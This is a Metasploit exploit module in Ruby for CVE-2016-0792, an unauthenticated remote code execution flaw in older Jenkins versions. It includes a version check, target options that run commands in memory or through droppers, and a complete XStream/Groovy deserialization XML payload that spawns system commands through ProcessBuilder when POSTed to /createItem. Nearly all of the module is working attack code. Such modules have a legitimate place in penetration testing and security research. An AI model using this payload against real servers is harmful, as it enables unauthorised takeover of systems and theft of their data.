# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Jenkins XStream Groovy classpath Deserialization Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits CVE-2016-0792 a vulnerability in Jenkins versions older than 1.650 and Jenkins LTS versions
        older than 1.642.2 which is caused by unsafe deserialization in XStream with Groovy in the classpath,
        which allows remote arbitrary code execution. The issue affects default installations. Authentication
        is not required to exploit the vulnerability.
      },
      &#039;Author&#039;         =>
          [
            &#039;Arshan Dabirsiaghi&#039;,       # Vulnerability discovery
            &#039;Matt Byrne <attackdebris[at]gmail.com>&#039;    # Metasploit module
          ],
      &#039;DisclosureDate&#039; => &#039;Feb 24 2016&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
          [
            [&#039;CVE&#039;, &#039;2016-0792&#039;],
            [&#039;URL&#039;, &#039;https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream&#039;],
            [&#039;URL&#039;, &#039;https://wiki.jenkins.io/pages/viewpage.action?pageId=95585413&#039;]
          ],
        &#039;Platform&#039;  => %w{ win linux unix },
        &#039;Arch&#039;           => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
        &#039;Targets&#039;        => [
        [&#039;Unix (In-Memory)&#039;,
          &#039;Platform&#039;   => &#039;unix&#039;,
          &#039;Arch&#039;       => ARCH_CMD
        ],
        [&#039;Python (In-Memory)&#039;,
          &#039;Platform&#039;   => &#039;python&#039;,
          &#039;Arch&#039;       => ARCH_PYTHON
        ],
        [&#039;Linux (Dropper)&#039;,
          &#039;Platform&#039;   => &#039;linux&#039;,
          &#039;Arch&#039;       => [ARCH_X86, ARCH_X64]
        ],
        [&#039;Windows (Dropper)&#039;,
          &#039;Platform&#039;   => &#039;win&#039;,
          &#039;Arch&#039;       => [ARCH_X86, ARCH_X64]
        ]
      ],
      &#039;DefaultTarget&#039; => 0
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Jenkins&#039;, &#039;/&#039;]),
      Opt::RPORT(&#039;8080&#039;)
    ])
    deregister_options(&#039;URIPATH&#039;)
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path)
    })

    unless res
      fail_with(Failure::Unknown, &#039;The connection timed out.&#039;)
    end

    http_headers = res.headers

    if http_headers[&#039;X-Jenkins&#039;] && http_headers[&#039;X-Jenkins&#039;].to_f < 1.650
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    case target.name
    when /Unix/, /Python/
      execute_command(payload.encoded)
    else
      execute_cmdstager
    end
  end

  # Exploit methods

  def execute_command(cmd, opts = {})
    cmd = case target.name
    when /Unix/, /Linux/
      %W{/bin/sh -c #{cmd}}
    when /Python/
      %W{python -c #{cmd}}
    when /Windows/
      %W{cmd.exe /c #{cmd}}
    end

    # Encode each command argument with XML entities
    cmd.map! { |arg| arg.encode(xml: :text) }

    res = send_request_cgi(
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;/createItem&#039;),
      &#039;vars_get&#039; => { &#039;name&#039; => &#039;random&#039; },
      &#039;ctype&#039;    => &#039;application/xml&#039;,
      &#039;data&#039;     => xstream_payload(cmd)
    )
  end

  def xstream_payload(cmd)
    <<EOF
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>#{cmd.join(&#039;</string><string>&#039;)}</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
EOF
  end
end

